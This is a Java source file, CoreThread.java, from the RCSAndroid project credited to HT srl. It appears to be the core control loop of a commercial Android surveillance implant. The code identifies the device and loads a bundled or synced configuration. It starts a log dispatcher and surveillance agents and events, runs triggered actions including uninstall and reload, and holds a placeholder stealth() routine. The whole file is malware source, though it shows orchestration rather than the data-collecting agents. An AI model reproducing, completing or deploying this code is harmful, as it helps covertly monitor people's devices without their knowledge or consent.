/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.action.SubAction;
import com.ht.RCSAndroidGUI.action.UninstallAction;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.event.EventManager;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class CoreThread.
 */
public class CoreThread extends Activity implements Runnable {
	
	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	// #ifdef DEBUG
	/** The debug. */
	protected static Debug debug = new Debug("CoreThread");
	// #endif

	/** The b stop core. */
	private boolean bStopCore = false;
	
	/** The resources. */
	private Resources resources;
	
	/** The core thread. */
	private Thread coreThread;
	
	/** The content resolver. */
	private ContentResolver contentResolver;
	
	/** The agent manager. */
	private AgentManager agentManager;
	
	/** The event manager. */
	private EventManager eventManager;

	/** The action thread. */
	Thread actionThread;

	/**
	 * Start.
	 *
	 * @param r the r
	 * @param cr the cr
	 * @return true, if successful
	 */
	public boolean Start(final Resources r, final ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();
		eventManager = EventManager.self();

		resources = r;
		contentResolver = cr;

		Check.asserts(resources != null, "Null Resources");

		coreThread.start();
		return true;
	}

	/**
	 * Stop.
	 *
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;
		Log.d("RCS", "RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	/* (non-Javadoc)
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		Log.d("RCS", "RCS Thread Started");

		stealth();
		try {
			for (;;) {
				// #ifdef DEBUG
				debug.info("init task");
				// #endif
				if (taskInit() == false) {
					// #ifdef DEBUG
					debug.error("TaskInit() FAILED");
					// #endif
					break;
				} else {
					// #ifdef DEBUG
					debug.trace("TaskInit() OK");
					// #endif
					// CHECK: Status o init?
				}
				Status.self().setRestarting(false);

				// #ifdef DEBUG
				debug.info("starting checking actions");
				// #endif
				if (checkActions() == false) {
					// #ifdef DEBUG
					debug.error("CheckActions() wants to exit");
					// #endif
					// chiudere tutti i thread
					break;
				} else {
					// #ifdef DEBUG
					debug.info("Waiting a while before reloading");
					// #endif
					Utils.sleep(2000);
				}
			}
		} catch (final Exception ex) {
			// #ifdef DEBUG
			debug.error("run " + ex);
			// #endif
		} finally {

			// #ifdef DEBUG
			debug.trace("RCSAndroid exit ");
			// #endif

			Utils.sleep(2000);
			System.exit(0);
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 *
	 * @return true, if successful
	 */
	private boolean checkActions() {
		final Status status = Status.self();

		Utils.sleep(1000);

		try {
			for (;;) {

				// #ifdef DEBUG
				debug.trace("checkActions");
				// #endif

				final int[] actionIds = status.getTriggeredActions();

				final int asize = actionIds.length;
				if (asize > 0) {

					for (int k = 0; k < asize; ++k) {
						final int actionId = actionIds[k];

						final Action action = status.getAction(actionId);
						final int exitValue = executeAction(action);

						if (exitValue == 1) {
							// #ifdef DEBUG
							debug.info("checkActions: Uninstall");
							// #endif

							UninstallAction.actualExecute();
							return false;
						} else if (exitValue == 2) {
							// #ifdef DEBUG
							debug.trace("checkActions: want Reload");
							// #endif
							return true;
						}
					}
				}

				Utils.sleep(SLEEPING_TIME);
			}
		} catch (final Throwable ex) {
			// catching trowable should break the debugger anc log the full
			// stack trace
			// #ifdef DEBUG
			debug.fatal("checkActions error, restart: " + ex);
			// #endif
			return true;
		}
	}

	/**
	 * Inizializza il core.
	 *
	 * @return false if any fatal error
	 */
	private boolean taskInit() {
		try {
			Path.makeDirs();

			// Identify the device uniquely
			final Device device = Device.self();
			device.init(contentResolver);

			if (!loadConf()) {
				debug.error("Cannot load conf");
				return false;
			}

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();
			logDispatcher.start();

			// Da qui in poi inizia la concorrenza dei thread

			if (eventManager.startEvents() == false) {
				// #ifdef DEBUG
				debug.trace("eventManager FAILED");
				// #endif
				return false;
			}

			// #ifdef DEBUG
			debug.info("Events started");

			// #endif

			if (agentManager.startAgents() == false) {
				// #ifdef DEBUG
				debug.trace("agentManager FAILED");
				// #endif
				return false;
			}

			// #ifdef DEBUG
			debug.info("Agents started");

			Log.d("RCS", "Exiting core");
			return true;

		} catch (final RCSException rcse) {
			rcse.printStackTrace();
			Log.d("RCS", "RCSException() detected");
		} catch (final Exception e) {
			e.printStackTrace();
			Log.d("RCS", "Exception() detected");
		}

		return false;

	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource conf.
	 *
	 * @return false if no correct conf available
	 * @throws RCSException the rCS exception
	 */
	public boolean loadConf() throws RCSException {

		boolean loaded = false;

		// tries to load the file got from the sync, if any.
		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
		if (file.exists()) {
			final byte[] resource = file.read(8);
			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.LoadConfiguration();

			debug.info("Conf file loaded: " + loaded);

		}

		// tries to load the resource conf
		if (!loaded) {
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.InputStreamToBuffer(resources
					.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.LoadConfiguration();

			debug.info("Resource file loaded: " + loaded);
		}

		return loaded;
	}

	/**
	 * Stealth.
	 */
	private void stealth() {
		// TODO Auto-generated method stub

	}

	/**
	 * Test run.
	 */
	public void testRun() {
		try {

			final byte[] resource = Utils.InputStreamToBuffer(resources
					.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Identify the device uniquely
			final Device device = Device.self();
			device.init(contentResolver);

			// Load the configuration
			conf.LoadConfiguration();

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();
			logDispatcher.start();

			// Start agents
			agentManager.startAgents();
			Utils.sleep(2000);
			/*
			 * agentManager.stopAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 * agentManager.startAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 * agentManager.restartAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
			 */
			// Stop agents
			agentManager.stopAgents();
			Utils.sleep(2000);

			final Status status = Status.self();
			status.triggerAction(0);
			final int[] actionIds = status.getTriggeredActions();
			final int asize = actionIds.length;
			if (asize > 0) {
				for (int k = 0; k < asize; ++k) {
					final int actionId = actionIds[k];
					final Action action = status.getAction(actionId);
					final int exitValue = executeAction(action);

					if (exitValue == 1) {
						// #ifdef DEBUG
						// debug.info("checkActions: Uninstall");
						// #endif

						// UninstallAction.actualExecute();
						// return false;
					} else if (exitValue == 2) {
						// #ifdef DEBUG
						// debug.trace("checkActions: want Reload");
						// #endif
						// return true;
					}
				}
			}

			// Ci stiamo chiudendo
			logDispatcher.halt();
			logDispatcher.join();

			Log.d("RCS", "LogDispatcher Killed");

		} catch (final RCSException rcse) {
			rcse.printStackTrace();
			Log.d("RCS", "RCSException() detected");
		} catch (final Exception e) {
			e.printStackTrace();
			Log.d("RCS", "Exception() detected");
		}

		Log.d("RCS", "Exiting core");
		return;

	}

	/**
	 * Execute action.
	 *
	 * @param action the action
	 * @return the int
	 */
	private int executeAction(final Action action) {
		int exit = 0;
		// #ifdef DEBUG
		debug.trace("CheckActions() triggered: " + action);
		// #endif

		final Status status = Status.self();
		status.unTriggerAction(action);
		// action.setTriggered(false, null);

		status.synced = false;
		// final Vector subActions = action.getSubActionsList();
		final int ssize = action.getSubActionsNum();

		// #ifdef DEBUG
		debug.trace("checkActions, " + ssize + " subactions");
		// #endif

		for (int j = 0; j < ssize; ++j) {
			try {
				final SubAction subAction = action.getSubAction(j);
				// #ifdef DBC
				Check.asserts(subAction != null,
						"checkActions: subAction!=null");
				// #endif

				// lastSubAction = subAction.toString();

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */

				// #ifdef DEBUG
				debug.info("CheckActions() executing subaction (" + (j + 1)
						+ "/" + ssize + ") : " + action);
				// #endif

				// no callingEvent
				subAction.prepareExecute();
				actionThread = new Thread(subAction);
				actionThread.start();

				synchronized (subAction) {
					// #ifdef DEBUG
					debug.trace("CheckActions() wait");
					// #endif
					if (!subAction.isFinished()) {
						// il wait viene chiamato solo se la start non e' gia'
						// finita
						subAction.wait(Configuration.TASK_ACTION_TIMEOUT);
					}
				}

				boolean ret = true;

				if (!subAction.isFinished()) {
					ret = false;
					actionThread.interrupt();
					// #ifdef DEBUG
					debug.trace("CheckActions() interrupted thread");
					// #endif
				}

				// #ifdef DEBUG
				debug.trace("CheckActions() waited");
				// #endif

				if (subAction.wantUninstall()) {
					// #ifdef DEBUG
					debug.warn("CheckActions() uninstalling");
					// #endif

					exit = 1;
					break;
					// return false;
				}

				if (subAction.wantReload()) {
					status.setRestarting(true);
					// #ifdef DEBUG
					debug.warn("checkActions: reloading");
					// #endif
					status.unTriggerAll();
					// #ifdef DEBUG
					debug.trace("checkActions: stopping agents");
					// #endif
					agentManager.stopAgents();
					// #ifdef DEBUG
					debug.trace("checkActions: stopping events");
					// #endif
					eventManager.stopEvents();
					Utils.sleep(2000);
					// #ifdef DEBUG
					debug.trace("checkActions: untrigger all");
					// #endif
					status.unTriggerAll();
					// return true;
					exit = 2;
					break;

				}

				if (ret == false) {
					// #ifdef DEBUG
					debug.warn("CheckActions() error executing: " + subAction);
					// #endif
					continue;
				}
			} catch (final Exception ex) {
				// #ifdef DEBUG
				debug.error("checkActions for: " + ex);
				// #endif
			}
		}

		return exit;
	}

	/**
	 * Inits the.
	 *
	 * @return true, if successful
	 */
	public boolean Init() {
		return false;
	}

	/**
	 * Run.
	 *
	 * @return true, if successful
	 */
	public boolean Run() {
		return false;
	}
}
